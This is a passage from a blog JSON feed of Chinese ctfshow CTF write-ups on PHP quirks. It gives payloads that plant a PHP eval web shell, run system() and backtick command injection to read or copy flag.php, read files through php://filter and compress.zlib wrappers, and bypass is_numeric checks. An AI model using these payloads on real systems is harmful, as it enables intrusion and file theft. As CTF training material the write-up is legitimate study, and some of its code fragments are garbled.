variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'('</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">')'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'*'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'+'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">','</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'-'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'.'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'0'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'2'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'3'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'4'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token variable\">$k</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'5'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'6'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'7'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'8'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'9'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">':'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">'`'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token variable\">$l</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//ABCDEFG</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//HIJKLMN</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'\t'</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//OPQRST</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token variable\">$o</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">''</span> <span class=\"token operator\">^</span> <span class=\"token string single-quoted-string\">']'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//UVWXYZ</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$A</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span> <span class=\"token operator\">&lt;=</span> <span class=\"token string single-quoted-string\">'o'</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$A</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">echo</span> <span class=\"token variable\">$$A</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">PHP_EOL</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure></li>\n</ol>\n</li>\n</ul>\n<p>web161  <code>content-type</code>  为 <code>png</code> ，文件头为 <code>GIF89a</code>  绕过</p>\n<p>web166 上传 zip，然后输入一句话</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/98069c85/",
            "url": "http://dpm12345.cn/posts/98069c85/",
            "title": "php 特性",
            "date_published": "2022-10-04T14:12:40.000Z",
            "content_html": "<h1 id=\"web-98\"><a href=\"#web-98\" class=\"headerlink\" title=\"web 98\"></a>web 98</h1><p>根据源码，可知，当传入get参数时。会将get改为post参数（后面的get会变成post，即highlight_file()的判断get参数时，会判断post参数下的值)</p>\n<p>所以说该题的解是，先随便传入一个get值，之后通过post传入<code>HTTP_FLAG=flag</code></p>\n<h1 id=\"web-99\"><a href=\"#web-99\" class=\"headerlink\" title=\"web 99\"></a>web 99</h1><p>关键在于</p>\n<pre><code class=\"php\">if (isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)) {\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n</code></pre>\n<p>这题主要是运用了<code>in_array()</code>的弱类型匹配</p>\n<p>故可以写</p>\n<pre><code class=\"raw\">?n=1.php\ncontent=&lt;?php eval($GET[1]);?&gt;\n1=systme('ls');\n1=system('tac flag.php');\n</code></pre>\n<h1 id=\"web-100\"><a href=\"#web-100\" class=\"headerlink\" title=\"web 100\"></a>web 100</h1><p><code>$v0 = is_numeric($v1) and is_numeric($v2) and is_numeric($v3);</code></p>\n<p>这是一个赋值加逻辑语句，而赋值优先级大于逻辑，故<code>v0</code>首先被赋值，后进行逻辑判断</p>\n<p>故<code>v0</code>的值只与<code>v1</code>的值有关，而后面<code>v2</code>和<code>v3</code>可以任意选</p>\n<p>这里由于只有<code>eval(\"$v2('ctfshow')$v3\");</code></p>\n<p>故采用<code>var_dump</code>函数打印，</p>\n<pre><code class=\"php\">payload1:\n?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;\n\npayload2: ?v1=1&amp;v2=eval($_POST[1])?&gt;&amp;v3=;\n1=highlight_file('ctfshow.php');\n</code></pre>\n<h1 id=\"web-101\"><a href=\"#web-101\" class=\"headerlink\" title=\"web 101\"></a>web 101</h1><p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web101.png\"></p>\n<p>改为这个</p>\n<p>利用反射机制</p>\n<p><code>?v1=1&amp;v2=echo new Reflectionclass&amp;v3=;</code></p>\n<h1 id=\"web-102\"><a href=\"#web-102\" class=\"headerlink\" title=\"web 102\"></a>web 102</h1><p>只有一种解，查看wp为</p>\n<p>对</p>\n<pre><code class=\"raw\">&lt;?=`cat *`;\n</code></pre>\n<p>base64编码后，删去末尾”=”,然后进行hex编码，可得到<code>5044383959474e6864434171594473</code>，恰好有<code>e</code>，可以用科学计数法绕过<code>v2</code>的数字判断，而<code>v1</code>可以传入<code>hex2bin</code>将十六进制转回base64，<code>v3</code>使用 <code>filter base64</code>写入文件，</p>\n<p>payload</p>\n<pre><code class=\"php\">?v2=115044383959474e6864434171594473&amp;v3=php://filter/convert.base64-decode/resource=web102_2.php\nv1=hex2bin\n</code></pre>\n<h1 id=\"web-103\"><a href=\"#web-103\" class=\"headerlink\" title=\"web 103\"></a>web 103</h1><p>同web 102做法</p>\n<h1 id=\"web-104\"><a href=\"#web-104\" class=\"headerlink\" title=\"web 104\"></a>web 104</h1><ol>\n<li>没有判断两值相同的情况，可分别赋一样的值得到flag</li>\n<li>由于shal对数组类型数据不能处理，返回false，因此也可以用数组绕过</li>\n<li></li>\n</ol>\n<h1 id=\"web-105\"><a href=\"#web-105\" class=\"headerlink\" title=\"web 105\"></a>web 105</h1><p>这题主要考虑对变量重新赋值的操作</p>\n<pre><code class=\"php\">&lt;?php\nhighlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error = '你还想要flag嘛？';\n$suces = '既然你想要那给你吧！';\nforeach ($_GET as $key =&gt; $value) {        \n    if ($key === 'error') {                  \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                   \n}\nforeach ($_POST as $key =&gt; $value) {    \n    if ($value === 'flag') {            \n        die(\"what are you doing?!\");\n    }\n    $$key = $$value;                  \n}\nif (!($_POST['flag'] == $flag)) {\n    die($error);\n}\necho \"your are good\" . $flag . \"\\n\";   \ndie($suces);\n</code></pre>\n<p>对<code>foreach()</code>中的参数进行研究，对于传入的GET值，键对应key，内容对应value；</p>\n<p>而之后的<code> $$key = $$val</code>, 则是对某一变量的重新赋值(或者创建一个变量)</p>\n<p>如 如果传入<code>?a=flag</code>, 那么 <code>$key=a``$value=flag</code>, 那么在进行 <code>$$key = $$value</code>语句时，即<code> $a = $flag</code></p>\n<p>那么flag值就传入了变量 a 中</p>\n<p>而对于第二个处理POST的<code>foreach()</code>也是一样的</p>\n<p>重要的是在之后的if判断语句，当POST传入的flag不等于原来的flag值时，将会输出error的值，而对于想要获取flag的我们来说，flag是未知的，也就是说这句判断一定为true，之后的语句一定会进入，即输出error的值</p>\n<p>由此，根据一开始的分析，我们可以设法使error的值变为flag的值</p>\n<p>对于post操作，由于对内容进行了判断，因此不能使用post进行把flag赋值到error的操作，因此只能通过get操作</p>\n<p>而通过对GET段代码判断，发现只过滤了error值，因此可以把flag赋值到某一变量中</p>\n<p>即对get，<code>?变量名=flag</code></p>\n<p>之后的post，需要将flag值赋值到error中，因此对POST<code>error=变量名</code></p>\n<p>而之后对POST flag的判断，由于一定为true，故输出error值，即flag</p>\n<h1 id=\"web-106\"><a href=\"#web-106\" class=\"headerlink\" title=\"web 106\"></a>web 106</h1><p>对于104的源代码增添了对传入值的相等判断，那么使用数组绕过 </p>\n<h1 id=\"web-107\"><a href=\"#web-107\" class=\"headerlink\" title=\"web 107\"></a>web 107</h1><p><code>parse_str(string $string , array &amp;$result ): void</code></p>\n<p>如果string是URL 传递入的查询字符串（query string），则将它解析为变量并设置到当前作用域（如果提供了result则会设置到该数组里）。</p>\n<p>再由代码，只需传入包含flag赋值的<code>v1</code>，和<code>MD5($v3)</code> 为传入的flag值</p>\n<p>payload</p>\n<pre><code class=\"php\">?v3=1\nv1=flag=c4ca4238a0b923820dcc509a6f75849b\n</code></pre>\n<h1 id=\"web-108\"><a href=\"#web-108\" class=\"headerlink\" title=\"web 108\"></a>web 108</h1><p>截断绕过</p>\n<p><code>?c=a%00778</code></p>\n<h1 id=\"web-109\"><a href=\"#web-109\" class=\"headerlink\" title=\"web 109\"></a>web 109</h1><p>关键在于<code>eval(\"echo new $v1($v2());\");</code></p>\n<h2 id=\"解法一\"><a href=\"#解法一\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>这里需要补充知识</p>\n<ol>\n<li><p>如果一个变量的后面跟上 ()，那么会将值作为函数进行调用</p>\n<p>如 <code>$a = 'phpinfo';$a();</code></p>\n<p>相当于进行了<code>phpinfo();</code></p>\n</li>\n<li><p>类于对象魔术方法</p>\n<p>下列方法名被认为是魔术方法： __construct() 、 __destruct() 、 __call() 、 __callStatic() 、 __get() 、 __set() 、 __isset() 、 __unset() 、 __sleep() 、 __wakeup() 、 __serialize() 、 __unserialize() 、 __toString() 、 __invoke() 、 __set_state() 、 __clone() 、 <strong>debugInfo() 。</strong></p>\n<p>__而__toString ()方法用于一个类被当成字符串时应怎样回应。例如<code>echo $obj;</code>应该显示些什么。</p>\n<p>如以下代码</p>\n<pre><code class=\"php\">class test\n{\n    public $a = 'test';\n    public function te()\n    {\n        return $this-&gt;a;\n    }\n    public function __toString()\n    {\n        return $this-&gt;a;\n    }\n}\necho new test();\n</code></pre>\n<p>将会输出 test</p>\n<p>这样可以采取该方法<code>?v1=mysqli&amp;v2=system('ls')</code>列出目录，之后<code>?v1=mysqli&amp;v2=system('tac flag.php')</code>读取文件</p>\n<p>或者可将<code>mysqli</code>换成<code>exception</code>类，<code>exception()</code>，括号中的参数会将其作为php代码执行(存疑，并不是这样)，不过滤</p>\n<p>因此<code>?v1=exception&amp;v2=system('tac flag.php')</code>也可</p>\n</li>\n</ol>\n<h2 id=\"解法二\"><a href=\"#解法二\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>将<code>v1</code>改为<code>reflectionclass</code></p>\n<p>实际上，经过尝试，对于大多数类都能这样</p>\n<p>但触发了<code>echo new test(phpinfo());</code>后，在之后的代码都不会执行 ==(具体原理不清楚)==</p>\n<p>大多数能够输出的原因 (猜测)：</p>\n<p>如果用 echo 输出一个类对象，那么输出结果由<code> __toString()</code>控制，而在高版本中，<code>__toString</code>自动存在，其内容为<code>print $value;</code>, 同时也可自己控制</p>\n<h1 id=\"web-110\"><a href=\"#web-110\" class=\"headerlink\" title=\"web 110\"></a>web 110</h1><p>过滤了各种字符，采用<code>FilesystemIterator</code>，参数写<code>getcwd</code>，<code>getcwd</code>用来取得当前工作目录， 两个连用后返回第一个名字</p>\n<h1 id=\"web-111\"><a href=\"#web-111\" class=\"headerlink\" title=\"web 111\"></a>web 111</h1><p>采用超全局变量GLOBALS，获取全局作用域下的可用的全部变量</p>\n<h1 id=\"web-112\"><a href=\"#web-112\" class=\"headerlink\" title=\"web 112\"></a>web 112</h1><pre><code class=\"php\">?file=php://filter/resource=flag.php\n?file=php://filter/convert.base32-encode/resource=flag.php// 当然 base32 等其他的 base 系列都是可以的，或者其他的编码形式\n?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php\n?file=compress.zlib://flag.php\n?file=php://filter/read=convert.iconv.utf-8.utf-16le/resource=flag.php\n</code></pre>\n<h1 id=\"web-113\"><a href=\"#web-113\" class=\"headerlink\" title=\"web 113\"></a>web 113</h1><p><code>is_file()</code>也支持一些包装器和伪协议，返回的值为 false</p>\n<h2 id=\"解法一-1\"><a href=\"#解法一-1\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>过滤器被过滤，使用压缩流<code>?file=compress.zlib://flag.php</code></p>\n<h2 id=\"解法二-1\"><a href=\"#解法二-1\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p>linux 里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容多次重复后绕过<code>is_file</code></p>\n<p>使用脚本跑，得到 payload</p>\n<h1 id=\"web-114\"><a href=\"#web-114\" class=\"headerlink\" title=\"web 114\"></a>web 114</h1><p>filter</p>\n<h1 id=\"web-115\"><a href=\"#web-115\" class=\"headerlink\" title=\"web 115\"></a>web 115</h1><pre><code class=\"php\">&lt;?php\nfor ($i = 1; $i &lt;= 128; $i = $i + 1) {\n    $temp = chr($i) . '1';\n    if (is_numeric($temp) &amp;&amp; trim($temp) !== '1') {\n        echo urlencode($temp), PHP_EOL;\n    }\n}\n</code></pre>\n<p>得到</p>\n<pre><code class=\"raw\">%0C1\n%2B1\n-1\n.1\n01\n11\n21\n31\n41\n51\n61\n71\n81\n91\n</code></pre>\n<p>对比过滤的符号，发现只有<code>%0c</code>可以用 </p>\n<p>payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-117\"><a href=\"#web-117\" class=\"headerlink\" title=\"web 117\"></a>web 117</h1><p>主要是要通过这些判断语句</p>\n<p><code>is_numeric($num)</code></p>\n<p><code>$num !== '36'</code></p>\n<p><code>trim($num) !== '36'</code></p>\n<p><code>filter($num) == '36') $num == '36'</code></p>\n<p><code>is_numeric()</code>用于判断<code>num</code>是否为一个数字，在数字前面加上如<code>%20</code>的空格，那么仍为<code>true</code>，如果在后面加，那么为<code>false</code></p>\n<p>第二句为不全等于，如果加了空格，因为比较的是字符串的内容，所以一定能通过</p>\n<p>第三句为<code>trim()</code>函数的应用</p>\n<pre><code class=\"php\">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： \n◦ \" \" (ASCII 32 (0x20))，普通空格符。  \n◦ \"\\t\" (ASCII 9 (0x09))，制表符。  \n◦ \"\\n\" (ASCII 10 (0x0A))，换行符。  \n◦ \"\\r\" (ASCII 13 (0x0D))，回车符。  \n◦ \"\\0\" (ASCII 0 (0x00))，空字节符。  \n◦ \"\\x0B\" (ASCII 11 (0x0B))，垂直制表符。\n</code></pre>\n<p>`</p>\n<p><code>%0c</code>也还是可以使用，因此可以输入<code>%0c36</code>绕过</p>\n<p>第四句为函数`filter的通过，观察代码，上述能通过</p>\n<p>第五句为弱等于，由于比较的内容中有数字，因此两边都转换为数字，经过本地测试，<code>%0c36</code>转换成了数字36，因此也能通过判断</p>\n<p>所以payload:<code>?num=%0c36</code></p>\n<h1 id=\"web-123\"><a href=\"#web-123\" class=\"headerlink\" title=\"web 123\"></a>web 123</h1><p>对于该题，看到需要<code>POST CT_SHOW</code>和<code>CTF_SHOW.COM</code>的值</p>\n<p>由于PHP变量只能由数字字母下划线，故如果直接上传<code>CTF_SHOW.COM</code>后，<code>.</code>会自动转换成下划线，上传的实际上是<code>CTF_SHOW_COM</code>的变量</p>\n<p>而为了防止对后面的点进行转换，可以将<code>CTF</code>后的下划线改为左方括号，这样，只会将该括号改为下划线，而后面的点不受影响，但是如果将其换为<code>.</code>或<code>+</code>，两个符号均会变成下划线</p>\n<p>再看代码，之后会进行<code>eval</code>函数， <code>$c</code> 为POST传入的<code>$fun</code>值</p>\n<h2 id=\"解法一-2\"><a href=\"#解法一-2\" class=\"headerlink\" title=\"解法一\"></a>解法一</h2><p>传入命令<code>extract($_POST)</code>将变量转为POST类型，然后通过POST传入<code>fl0g=flag_give_me</code>绕过对GET变量的判断，并且满足第二个判断条件</p>\n<p>payload: <code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=extract($_POST)&amp;fl0g=flag_give_me</code></p>\n<h2 id=\"解法二-2\"><a href=\"#解法二-2\" class=\"headerlink\" title=\"解法二\"></a>解法二</h2><p><code>get_defined_vars</code> —— 返回由所有已定义变量所组成的数组</p>\n<p>由于返回的是数组，<code>echo</code>输出数组只能输出<code>Array</code>，因此需要一个输出数组的函数或者将数组转换为字符串</p>\n<p>但输出数组的函数<code>var_dump()</code>,<code>print_r()</code>被禁用，故尝试使数组转换为字符串</p>\n<ul>\n<li><p>implode</p>\n<p>implode —— 将一个一维数组的值转化为字符串</p>\n<p>payload:<code>CTF_SHOW=1&amp;CTF[SHOW.COM=2&amp;fun=echo implode(get_defined_vars())</code></p>\n</li>\n</ul>\n<h2 id=\"解法三\"><a href=\"#解法三\" class=\"headerlink\" title=\"解法三\"></a>解法三</h2><p>利用<code>argv</code>数组</p>\n<p>数组中，用空格来进行值的分别</p>\n<p>GET:<code>?a=1+fl0g=flag_give_me</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=parse_str($a[1])</code></p>\n<h2 id=\"解法四\"><a href=\"#解法四\" class=\"headerlink\" title=\"解法四\"></a>解法四</h2><p>GET:<code>1=flag.php</code></p>\n<p>POST:<code>CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=highlight_file($_GET[1])</code></p>\n<h2 id=\"解法五\"><a href=\"#解法五\" class=\"headerlink\" title=\"解法五\"></a>解法五</h2><p><code>var_dump($GLOBALS)</code></p>\n<h1 id=\"web-125\"><a href=\"#web-125\" class=\"headerlink\" title=\"web 125\"></a>web 125</h1><p>过滤了<code>flag|GLOBALS|echo|var_dump|print</code></p>\n<p>仍可使用上面的法1、法3、法4</p>\n<h1 id=\"web-126\"><a href=\"#web-126\" class=\"headerlink\" title=\"web 126\"></a>web 126</h1><p>使用法三</p>\n<h1 id=\"web-127\"><a href=\"#web-127\" class=\"headerlink\" title=\"web 127\"></a>web 127</h1><p>用空格绕过 <code>_</code></p>\n<p><code>?ctf show=ilove36d</code></p>\n<p><code>$_SERVER [QUERY_STRING]</code>，经过验证，不能显示post传参的内容，故只能采取get传参</p>\n<h1 id=\"web-128\"><a href=\"#web-128\" class=\"headerlink\" title=\"web 128\"></a>web 128</h1><p>主要使用<code>gettext</code>函数</p>\n<p>获取当前信息，可以获取到参数中的值，而它又可以使用<code>_</code>代替该函数</p>\n<p>所以 payload:<code>?f1=_&amp;f2=get_defined_vars</code></p>\n<h1 id=\"web-129\"><a href=\"#web-129\" class=\"headerlink\" title=\"web 129\"></a>web 129</h1><p>目录穿越</p>\n<p><code>../ctfshow/../html/flag.php</code> （或其他)</p>\n<h1 id=\"web-130\"><a href=\"#web-130\" class=\"headerlink\" title=\"web 130\"></a>web 130</h1><p><code>f=ctfshow</code></p>\n<p>或数组绕过</p>\n<p><code>f[]=1</code></p>\n<h1 id=\"web-131\"><a href=\"#web-131\" class=\"headerlink\" title=\"web 131\"></a>web 131</h1><p><code>$a = str_repeat(\"show\",250000); $b = $a . \"36Dctfshow\"; echo $b;</code></p>\n<p>长度限制，绕过正则</p>\n<h1 id=\"web-132\"><a href=\"#web-132\" class=\"headerlink\" title=\"web 132\"></a>web 132</h1><p>逻辑运算符的优先级判断</p>\n<p>payload:<code>?username=admin&amp;password=1&amp;code=adm3in</code></p>\n<h1 id=\"web-133\"><a href=\"#web-133\" class=\"headerlink\" title=\"web 133\"></a>web 133</h1><h2 id=\"curl-外带\"><a href=\"#curl-外带\" class=\"headerlink\" title=\"curl 外带\"></a>curl 外带</h2><p>curl</p>\n<h2 id=\"Linux-中的-cp-命令\"><a href=\"#Linux-中的-cp-命令\" class=\"headerlink\" title=\"Linux 中的 cp 命令\"></a>Linux 中的 cp 命令</h2><p>利用<code>cp</code>命令将flag.php写入1.txt，然后访问1.txt</p>\n<pre><code class=\"raw\">payload：\n?F=`$F` ;cp flag.php 1234.txt\n/1234.txt\n</code></pre>\n<p>注意是反引号，相当于shell_exec()函数</p>\n<p>成功原因</p>\n<p>虽然<code>substr</code>只取前六位，但在该payload中，由于前六位是</p>\n<pre><code class=\"raw\">`$F` ;\n</code></pre>\n<p>读入后变量的值会放进去变成</p>\n<pre><code class=\"raw\">``$F` ;cp flag.php 1234.txt`\n</code></pre>\n<h2 id=\"PING\"><a href=\"#PING\" class=\"headerlink\" title=\"PING\"></a>PING</h2><h1 id=\"web-134\"><a href=\"#web-134\" class=\"headerlink\" title=\"web 134\"></a>web 134</h1><p>观察代码</p>\n<p><code>parse_str</code> — 将字符串解析成多个变量</p>\n<p><code>extract</code> — 从数组中将变量导入到当前的符号表 